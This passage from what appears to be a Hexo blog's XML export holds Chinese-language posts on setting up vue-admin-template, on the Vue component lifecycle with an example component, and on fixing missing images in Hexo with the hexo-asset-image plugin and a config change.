MG* 第一次构建脚本包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rpm包构建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快速搭建前端工程学习记录</title>
      <link href="/2021/08/29/vue-admin-template/"/>
      <url>/2021/08/29/vue-admin-template/</url>
      
        <content type="html"><![CDATA[<h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><ul><li><p><input checked="" disabled="" type="checkbox">  项目跑起来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 克隆项目</span><span class="token function">git</span> clone https://github.com/PanJiaChen/vue-admin-template.git<span class="token comment"># 进入项目目录</span><span class="token builtin class-name">cd</span> vue-admin-template<span class="token comment"># 安装依赖</span><span class="token function">npm</span> <span class="token function">install</span><span class="token comment"># 建议不要直接使用 cnpm 安装以来，会有各种诡异的 bug。可以通过如下操作解决 npm 下载速度慢的问题</span><span class="token function">npm</span> <span class="token function">install</span> --registry<span class="token operator">=</span>https://registry.npm.taobao.org<span class="token comment"># 启动服务</span><span class="token function">npm</span> run dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><input checked="" disabled="" type="checkbox">  项目结构</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">├── build                      // 构建相关  ├── config                     // 配置相关├── src                        // 源代码│   ├── api                    // 所有请求│   ├── assets                 // 主题 字体等静态资源│   ├── components             // 全局公用组件│   ├── directive              // 全局指令│   ├── filtres                // 全局 filter│   ├── icons                  // 项目所有 svg icons│   ├── lang                   // 国际化 language│   ├── mock                   // 项目mock 模拟数据│   ├── router                 // 路由│   ├── store                  // 全局 store管理│   ├── styles                 // 全局样式│   ├── utils                  // 全局公用方法│   ├── vendor                 // 公用vendor│   ├── views                   // view│   ├── App.vue                // 入口页面│   ├── main.js                // 入口 加载组件 初始化等│   └── permission.js          // 权限管理├── static                     // 第三方不打包资源│   └── Tinymce                // 富文本├── .babelrc                   // babel-loader 配置├── eslintrc.js                // eslint 配置项├── .gitignore                 // git 忽略项├── favicon.ico                // favicon图标├── index.html                 // html模板└── package.json               // package.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><input checked="" disabled="" type="checkbox">  代码生成实战</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VUE生命周期学习</title>
      <link href="/2021/08/28/vue-life/"/>
      <url>/2021/08/28/vue-life/</url>
      
        <content type="html"><![CDATA[<h3 id="生命周期示意图"><a href="#生命周期示意图" class="headerlink" title="生命周期示意图"></a>生命周期示意图</h3><img src="/2021/08/28/vue-life/vue.png" alt="vue生命周期" style="zoom: 67%;"><h3 id="过程详解"><a href="#过程详解" class="headerlink" title="过程详解"></a>过程详解</h3><p><strong>始创建、初始化数据、编译模板、挂载Dom、渲染→更新→渲染、卸载</strong></p><ol><li>调用new Vue()实例化一个vue实例，init初始化event 和 lifecycle；其实这个过程中分别调用了3个初始化函数（initLifecycle(), initEvents(), initRender()），分别初始化了生命周期，事件以及定义createElement函数，初始化生命周期时，定义了一些属性，比如表示当前状态生命周期状态得_isMounted ，_isDestroyed ，_isBeingDestroyed，表示keep-alive中组件状态的_inactive，而初始化event时，实际上就是定义了$once、$off、$emit、$on几个函数。而createElement函数是在初始化render时定义的（调用了initRender函数）。</li><li><strong>调用beforeCreate</strong>。在new一个vue实例后，只有一些默认的生命周期钩子和默认事件，他的东西都还没创建。在beforeCreate生命周期执行的时候，<strong>data和methods中的数据都还没有初始化，不能在这个阶段使用data中的数据和methods中的方法</strong>。</li><li>beforeCreate执行完后，会开始进<strong>行数据初始化</strong>，这个过程，会定义data数据，方法以及事件，并且完成数据劫持observe以及给组件实例配置watcher观察者实例。这样，<strong>后续当数据发生变化时，才能感知到数据的变化并完成页面的渲染</strong>。</li><li><strong>调用created</strong>生命周期函数，所以，当这个函数执行的时候，我们已经可以拿到<strong>data下的数据以及methods下的方法但是无法获取 DOM</strong>，所以在这里，我们可以开始调用方法进行数据请求。</li><li>created执行完后，我们可以看到，这里有个判断，判断当前是否有el参数(这里为什么需要判断，是因为我们后面的操作是会依赖这个el的，后面会详细说)，如果有，我们再看是否有template参数。如果没有el，那么我们会等待调用$mount(el)方法(后面会详细说)。</li><li>确保有了el后，继续往下走，判断当有template参数时，我们会选择去将template模板转换成render函数（其实在这前面是还有一个判断的，判断当前是否有render函数，如果有的话，则会直接去渲染当前的render函数，如果没有那么我们才开始去查找是否有template模板），如果没有template，那么我们就会直接将获取到的el（也就是我们常见的#app，#app里面可能还会有其他标签）编译成templae, 然后在将这个template转换成render函数。</li><li><strong>调用beforMount</strong>， 执行到这个钩子的时候，<strong>在内存中已经编译好了模板了，但是还没有挂载到页面中，此时，页面还是旧的</strong>。也就是说实际从creted到beforeMount之间，最主要的工作就是将模板或者el转换为render函数。并且我们可以看出一点，就是你不管是用el，还是用template, 或者是用我们最常用的.vue文件(如果是.vue文件，他其实是会先编译成为template)，最终他都是会被转换为render函数的。</li><li>beforeMount调用后，我们是不是要开始渲染render函数了，首先我们会先生产一个虚拟dom（用于后续数据发生变化时，新老虚拟dom对比计算），进行保存，然后再开始将render渲染成为真实的dom。渲染成真实dom后，会将渲染出来的<strong>真实dom替换掉原来的vm.$el</strong>（这一步我们可能不理解，请耐心往下看，后面我会举例说明）,然后再将替换后的$el append到我们的页面内。整个初步流程就算是走完了</li><li><strong>调用mounted</strong>，并将标识生命周期的一个属性_isMounted 置为true。所以mounted函数内，我们是可以操作dom的，因为这个时候dom已经渲染完成了。_</li><li>再之后，只有当我们状态<strong>数据发生变化时,我们在触发beforeUpdate</strong>，要开始将我们变化后的数据渲染到页面上了（实际上这里是有个判断的，判断当前的_isMounted是不是为ture并且_isDestroyed是不是为false，也就是说，保证dom已经被挂载的情况下，且当前组件并未被销毁，才会走update流程）</li><li>beforeUpdate调用之后，我们又会重新生成一个新的虚拟dom(Vnode)，然后会拿这个最新的Vnode和原来的Vnode去做一个diff算，这里就涉及到一系列的计算，算出最小的更新范围，从而更新render函数中的最新数据，再将更新后的render函数渲染成真实dom。也就完成了我们的数据更新</li><li><strong>调用updated</strong>，所以updated里面也可以操作dom，并拿到最新更新后的dom。不过这里我要插一句话了，mouted和updated的执行，并不会等待所有子组件都被挂载完成后再执行，<strong>所以如果你希望所有视图都更新完毕后再做些什么事情，那么你最好在mouted或者updated中加一个$nextTick（）</strong>，然后把要做的事情放在$netTick()中去做（至于为什么，以后讲到$nextTick再说吧）</li><li>再之后beforeDestroy没啥说的，实例销毁前，也就是说在这个函数内，你还是可以操作实例的<br>之后会做一系列的销毁动作，解除各种数据引用，移除事件监听，删除组件_watcher，删除子实例，删除自身self等。同时将实例属性_isDestroyed置为true</li><li>销毁完成后，再执行destroyed</li></ol><h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token comment">/** * Vue生命周期解析 */</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  <span class="token comment">/**   * name: name   * type: string   * explain: 允许组件模板递归地调用自身。   * 注意，组件在全局用 Vue.component() 注册时，全局 ID 自动作为组件的 name。   * 指定 name 选项的另一个好处是便于调试。有名字的组件有更友好的警告信息。   * 另外，当在有 vue-devtools，未命名组件将显示成 &lt;AnonymousComponent&gt;，这很没有语义。   * 通过提供 name 选项，可以获得更有语义信息的组件树。   */</span>  name<span class="token operator">:</span> <span class="token string">"home"</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: data   * type: object | function   * explain: Vue 实例的数据对象。   * Vue 将会递归将 data 的属性转换为 getter/setter，从而让 data 的属性能够响应数据变化。   */</span>  <span class="token function-variable function">data</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token punctuation">{</span>      explain<span class="token operator">:</span> <span class="token string">"home"</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: beforeCreate   * type: function   * explain: 在实例初始化之后，数据观测 (data observer) 和 event/watcher 事件配置之前被调用   * data和methods中的数据都还没有初始化，不能在这个阶段使用data中的数据和methods中的方法   */</span>  <span class="token function-variable function">beforeCreate</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home beforeCreate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: created   * type: function   * explain: 在实例创建完成后被立即调用。在这一步，实例已完成以下的配置：数据观测 (data observer)，   * 属性和方法的运算，watch/event 事件回调。然而，挂载阶段还没开始，$el 属性目前不可见。   */</span>  <span class="token function-variable function">created</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home created"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: beforeMount   * type: function   * explain: 在挂载开始之前被调用：相关的 render 函数首次被调用。该钩子在服务器端渲染期间不被调用。   */</span>  <span class="token function-variable function">beforeMount</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home beforeMount"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: mounted   * type: function   * explain: el 被新创建的 vm.$el 替换，并挂载到实例上去之后调用该钩子。   * 如果 root 实例挂载了一个文档内元素，当 mounted 被调用时 vm.$el 也在文档内。   * 注意 mounted 不会承诺所有的子组件也都一起被挂载。   * 如果你希望等到整个视图都渲染完毕，可以用 vm.$nextTick 替换掉 mounted：   * 该钩子在服务器端渲染期间不被调用。   */</span>  <span class="token function-variable function">mounted</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home mounted"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home mounted $nextTick"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: beforeUpdate   * type: function   * explain: 数据更新时调用，发生在虚拟 DOM 打补丁之前。   * 这里适合在更新之前访问现有的 DOM，比如手动移除已添加的事件监听器。   * 该钩子在服务器端渲染期间不被调用，因为只有初次渲染会在服务端进行。   */</span>  <span class="token function-variable function">beforeUpdate</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home beforeUpdate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: updated   * type: function   * explain: 由于数据更改导致的虚拟 DOM 重新渲染和打补丁，在这之后会调用该钩子。   * 当这个钩子被调用时，组件 DOM 已经更新，所以你现在可以执行依赖于 DOM 的操作。   * 然而在大多数情况下，你应该避免在此期间更改状态。   * 如果要相应状态改变，通常最好使用计算属性或 watcher 取而代之。   * 注意 updated 不会承诺所有的子组件也都一起被重绘。   * 如果你希望等到整个视图都重绘完毕，可以用 vm.$nextTick 替换掉 updated：   * 该钩子在服务器端渲染期间不被调用。   */</span>  <span class="token function-variable function">updated</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home updated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home updated $nextTick"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: activated   * type: function   * explain: keep-alive 组件激活时调用。   * 该钩子在服务器端渲染期间不被调用。   * 构建组件 - keep-alive  https://cn.vuejs.org/v2/api/#keep-alive   * 动态组件 - keep-alive  https://cn.vuejs.org/v2/guide/components.html#keep-alive   */</span>  <span class="token function-variable function">activated</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home activated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: beforeDestroy   * type: function   * explain: 实例销毁之前调用。在这一步，实例仍然完全可用。   * 该钩子在服务器端渲染期间不被调用。   */</span>  <span class="token function-variable function">beforeDestroy</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home beforeDestroy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token comment">/**   * name: destroyed   * type: function   * explain: Vue 实例销毁后调用。   * 调用后，Vue 实例指示的所有东西都会解绑定，   * 所有的事件监听器会被移除，所有的子实例也会被销毁。   * 该钩子在服务器端渲染期间不被调用。   */</span>  <span class="token function-variable function">destroyed</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"home destroyed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考：</p><p><a href="https://blog.csdn.net/weixin_42707287/article/details/111641286">超详细vue生命周期解析(详解)</a></p><p><a href="https://godbasin.github.io/vue-ebook/">深入理解Vue.js实战</a></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HEXO图片不展示问题解决</title>
      <link href="/2021/08/26/hexo-tu-pian-bu-zhan-shi-wen-ti-jie-jue/"/>
      <url>/2021/08/26/hexo-tu-pian-bu-zhan-shi-wen-ti-jie-jue/</url>
      
        <content type="html"><![CDATA[<h3 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h3><p>于工程根目录下执行如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> https://github.com/CodeFalling/hexo-asset-image --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="修改插件代码"><a href="#修改插件代码" class="headerlink" title="修改插件代码"></a>修改插件代码</h3><p>/node_modules/hexo-asset-image/index.js</p><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token string">'use strict'</span><span class="token punctuation">;</span><span class="token keyword">var</span> cheerio <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'cheerio'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// http://stackoverflow.com/questions/14480345/how-to-get-the-nth-occurrence-in-a-string</span><span class="token keyword">function</span> <span class="token function">getPosition</span><span class="token punctuation">(</span><span class="token parameter">str<span class="token punctuation">,</span> m<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> version <span class="token operator">=</span> <span class="token function">String</span><span class="token punctuation">(</span>hexo<span class="token punctuation">.</span>version<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hexo<span class="token punctuation">.</span>extend<span class="token punctuation">.</span>filter<span class="token punctuation">.</span><span class="token function">register</span><span class="token punctuation">(</span><span class="token string">'after_post_render'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> config <span class="token operator">=</span> hexo<span class="token punctuation">.</span>config<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>config<span class="token punctuation">.</span>post_asset_folder<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">var</span> link <span class="token operator">=</span> data<span class="token punctuation">.</span>permalink<span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>version<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">Number</span><span class="token punctuation">(</span>version<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>   <span class="token keyword">var</span> beginPos <span class="token operator">=</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>link<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">else</span>   <span class="token keyword">var</span> beginPos <span class="token operator">=</span> <span class="token function">getPosition</span><span class="token punctuation">(</span>link<span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// In hexo 3.1.1, the permalink of "about" page is like ".../about/index.html".</span><span class="token keyword">var</span> endPos <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    link <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>beginPos<span class="token punctuation">,</span> endPos<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> toprocess <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'excerpt'</span><span class="token punctuation">,</span> <span class="token string">'more'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> toprocess<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">var</span> key <span class="token operator">=</span> toprocess<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">var</span> $ <span class="token operator">=</span> cheerio<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>        ignoreWhitespace<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        xmlMode<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        lowerCaseTags<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        decodeEntities<span class="token operator">:</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">// For windows style path, we replace '\' to '/'.</span><span class="token keyword">var</span> src <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">'\\'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">http[s]*.*|\/\/.*</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>   <span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^\s*\/</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment">// For "about" page, the first part of "src" can't be removed.</span>  <span class="token comment">// In addition, to support multi-level local directory.</span>  <span class="token keyword">var</span> linkArray <span class="token operator">=</span> link<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> elem <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> srcArray <span class="token operator">=</span> src<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">elem</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> elem <span class="token operator">!=</span> <span class="token string">''</span> <span class="token operator">&amp;&amp;</span> elem <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>srcArray<span class="token punctuation">.</span>length <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span>srcArray<span class="token punctuation">.</span><span class="token function">shift</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  src <span class="token operator">=</span> srcArray<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> config<span class="token punctuation">.</span>root <span class="token operator">+</span> link <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>  console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"update link as:--&gt;"</span><span class="token operator">+</span>config<span class="token punctuation">.</span>root <span class="token operator">+</span> link <span class="token operator">+</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"no src attr, skipped..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span>info<span class="token operator">&amp;&amp;</span>console<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      data<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> $<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>_config.yml</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">post_asset_folder</span><span class="token punctuation">:</span> <span class="token boolean important">true</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
